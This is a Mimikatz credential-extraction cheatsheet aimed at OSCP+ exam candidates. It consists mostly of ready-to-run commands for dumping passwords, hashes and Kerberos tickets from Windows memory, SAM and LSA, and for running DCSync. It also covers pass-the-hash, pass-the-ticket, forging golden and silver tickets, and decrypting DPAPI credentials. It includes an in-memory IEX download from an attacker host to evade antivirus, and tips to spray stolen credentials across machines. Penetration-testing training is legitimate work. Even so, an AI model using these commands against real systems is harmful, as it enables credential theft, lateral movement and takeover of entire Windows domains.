# Mimikatz - Credential Extraction Cheatsheet (OSCP+)

Mimikatz extracts plaintext passwords, NTLM hashes, Kerberos tickets, and more from Windows memory. You need **local admin or SYSTEM** privileges to run most commands. This is one of the most important post-exploitation tools for OSCP+.

---

### Transfer and Run

#### Upload to Target

```bash
# From evil-winrm
upload /home/kali/tools/mimikatz.exe

# From SMB share
copy \\KALI_IP\share\mimikatz.exe C:\Users\Public\mimikatz.exe

# From HTTP
certutil -urlcache -f http://KALI_IP/mimikatz.exe C:\Users\Public\mimikatz.exe
```

#### Run Mimikatz

```cmd
# Interactive mode
.\mimikatz.exe

# One-liner (run and exit)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### First Command Always

```
mimikatz # privilege::debug
Privilege '20' OK
```

If you see `Privilege '20' OK` — you're good. If it fails, you don't have enough privileges.

---

### Dump Credentials from Memory

#### Dump All Logged-on User Credentials

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

This is the **most important command**. It dumps plaintext passwords, NTLM hashes, and Kerberos tickets for all users who have logged into the machine.

One-liner:

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### Dump NTLM Hashes Only

```
mimikatz # privilege::debug
mimikatz # sekurlsa::msv
```

#### Dump Kerberos Tickets

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

#### Dump WDigest (Plaintext Passwords)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest
```

---

### Dump SAM Database (Local Hashes)

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

One-liner:

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

---

### Dump LSA Secrets

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

LSA secrets can contain service account passwords, cached domain credentials, and more.

---

### DCSync Attack (Dump from Domain Controller)

You need a user with **Replicating Directory Changes** privileges (Domain Admin or user with DCSync rights). You do NOT need to run this on the DC — you can run it from any domain-joined machine.

#### Dump a Specific User

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

One-liner:

```cmd
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:Administrator" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
```

#### Dump All Domain Hashes

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:domain.local /all
```

---

### Pass the Hash (PTH)

Run a command as another user using their NTLM hash.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH_HERE /run:cmd.exe
```

This opens a new cmd.exe running as that user. From there you can access other machines:

```cmd
# In the new cmd window
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe
```

One-liner:

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe" "exit"
```

---

### Pass the Ticket (PTT)

#### Export All Tickets

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

#### Inject a Ticket

```
mimikatz # kerberos::ptt ticket.kirbi
```

#### Verify Ticket

```cmd
klist
```

---

### Golden Ticket

Golden Ticket gives you unlimited access to the entire domain. You need the **krbtgt NTLM hash** and **domain SID**.

#### Get the krbtgt Hash

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

#### Get Domain SID

```cmd
whoami /user
# SID = everything before the last dash
# S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID = S-1-5-21-1987370270-658905905-1781884369
```

#### Create Golden Ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /ptt
```

- `/user:` — any username (can be fake)
- `/domain:` — domain name
- `/sid:` — domain SID
- `/krbtgt:` — NTLM hash of krbtgt
- `/ptt` — inject ticket into current session

#### Use the Golden Ticket

```cmd
# Access any machine
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe
```

---

### Silver Ticket

Silver Ticket gives you access to a specific service. You need the **service account's NTLM hash**.

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXX /target:DC01.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt
```

Common service names: `cifs` (file shares), `http` (web), `mssql`, `ldap`, `host`

---

### DPAPI - Decrypt Saved Credentials

#### Find Credential Files

```cmd
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

#### Find Master Key

```cmd
dir C:\Users\username\AppData\Roaming\Microsoft\Protect\
```

#### Decrypt

```
mimikatz # dpapi::cred /in:C:\Users\username\AppData\Roaming\Microsoft\Credentials\CREDENTIAL_FILE

mimikatz # dpapi::masterkey /in:C:\Users\username\AppData\Roaming\Microsoft\Protect\SID\MASTERKEY_FILE /rpc
```

---

### Token Impersonation

```
mimikatz # privilege::debug
mimikatz # token::elevate
```

This elevates to SYSTEM token. Useful before dumping SAM or LSA.

```
# Elevate to a specific user's token
mimikatz # token::elevate /domainadmin
```

---

### OSCP+ Exam Quick Reference

```cmd
# === FIRST: Get debug privilege ===
.\mimikatz.exe "privilege::debug" "exit"

# === DUMP EVERYTHING FROM MEMORY ===
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# === DUMP LOCAL HASHES (SAM) ===
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# === DUMP LSA SECRETS ===
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# === DCSYNC (from any domain machine with DA creds) ===
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:Administrator" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"

# === PASS THE HASH ===
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe" "exit"

# === GOLDEN TICKET ===
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt" "exit"
```

---

### Save Output to File

```cmd
# Log everything to a file
.\mimikatz.exe "privilege::debug" "log output.txt" "sekurlsa::logonpasswords" "exit"
```

---

### If Mimikatz Gets Blocked (AV/Defender)

#### Use Invoke-Mimikatz (PowerShell Version)

```powershell
# Load in memory (no file on disk)
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

#### Use SharpKatz (C# Alternative)

```cmd
.\SharpKatz.exe --Command logonpasswords
```

#### Use impacket-secretsdump Instead (From Kali)

```bash
# Does the same thing remotely without touching the target
impacket-secretsdump domain.local/admin:'password'@10.10.10.5
```

---

### Pro Tips

- Always run `privilege::debug` first — everything else fails without it
- `sekurlsa::logonpasswords` is the first command you should run on every machine you compromise
- Run mimikatz on EVERY machine you get admin on — different machines have different cached creds
- DCSync can be run from ANY domain-joined machine — you don't need to be on the DC
- If mimikatz gets detected by AV, use impacket-secretsdump from Kali instead — same results
- Save output with `log output.txt` — don't lose creds if your shell dies
- After dumping creds, always spray them across all machines with NetExec
- Golden Ticket needs krbtgt hash + domain SID — write these down immediately when you get them
- One-liners are better than interactive mode during the exam — faster and you can scroll back